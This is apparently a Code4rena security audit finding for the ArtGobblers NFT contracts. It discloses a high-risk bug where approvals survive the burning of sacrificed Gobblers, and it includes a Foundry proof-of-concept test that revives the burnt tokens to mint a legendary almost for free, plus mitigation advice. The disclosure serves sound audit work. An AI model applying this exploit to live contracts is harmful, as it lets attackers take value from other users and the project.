## Tags

- bug
- 3 (High Risk)
- primary issue
- sponsor confirmed
- selected for report

# [Can Recover Gobblers Burnt In Legendary Mint](https://github.com/code-423n4/2022-09-artgobblers-findings/issues/219) 

# Lines of code

https://github.com/code-423n4/2022-09-artgobblers/blob/d2087c5a8a6a4f1b9784520e7fe75afa3a9cbdbe/src/ArtGobblers.sol#L432
https://github.com/code-423n4/2022-09-artgobblers/blob/d2087c5a8a6a4f1b9784520e7fe75afa3a9cbdbe/src/ArtGobblers.sol#L890


# Vulnerability details

## Impact
Allows users to mint legendary Gobblers for free assuming they have the necessary amount of Gobblers to begin with. This is achieved by "reviving" sacrificed Gobblers after having called `mintLegendaryGobbler`.

## Severity Justification
This vulnerability allows the violation of the fundamental mechanics of in-scope contracts, allowing buyers to purchase legendary Gobblers at almost no cost outside of temporary liquidity requirements which can be reduced via the use of NFT flashloans.

## Proof of Concept (PoC):
Add the following code to the `ArtGobblersTest` contract in  `test/ArtGobblers.t.sol`  and run the test via `forge test --match-test testCanReuseSacrificedGobblers  -vvv`:
```solidity
function testCanReuseSacrificedGobblers() public {
	address user = users[0];

	// setup legendary mint
	uint256 startTime = block.timestamp + 30 days;
	vm.warp(startTime);
	mintGobblerToAddress(user, gobblers.LEGENDARY_AUCTION_INTERVAL());
	uint256 cost = gobblers.legendaryGobblerPrice();
	assertEq(cost, 69);
	setRandomnessAndReveal(cost, "seed");

	for (uint256 curId = 1; curId <= cost; curId++) {
		ids.push(curId);
		assertEq(gobblers.ownerOf(curId), users[0]);
	}

	// do token approvals for vulnerability exploit
	vm.startPrank(user);
	for (uint256 i = 0; i < ids.length; i++) {
		gobblers.approve(user, ids[i]);
	}
	vm.stopPrank();

	// mint legendary
	vm.prank(user);
	uint256 mintedLegendaryId = gobblers.mintLegendaryGobbler(ids);

	// confirm user owns legendary
	assertEq(gobblers.ownerOf(mintedLegendaryId), user);

	// show that contract initially thinks tokens are burnt
	for (uint256 i = 0; i < ids.length; i++) {
		hevm.expectRevert("NOT_MINTED");
		gobblers.ownerOf(ids[i]);
	}

	// "revive" burnt tokens by transferring from zero address with approval
	// which was not reset
	vm.startPrank(user);
	for (uint256 i = 0; i < ids.length; i++) {
		gobblers.transferFrom(address(0), user, ids[i]);
		assertEq(gobblers.ownerOf(ids[i]), user);
	}
	vm.stopPrank();
}
```

## Tools Used
Manual review.

## Recommended Mitigation Steps
Ensure token ownership is reset in the for-loop of the `mintLegendaryGobbler` method. Alternatively to reduce the gas cost of `mintLegendaryGobbler` by saving on the approval deletion, simply check the `from` address in `transferFrom`, revert if it's `address(0)`. Note that the latter version would also require changing the `getApproved` view method such that it checks the owner of the token and returns the zero-address if the owner is zero, otherwise the `getApproved` method would return the old owner after the underlying Gobbler was sacrificed.
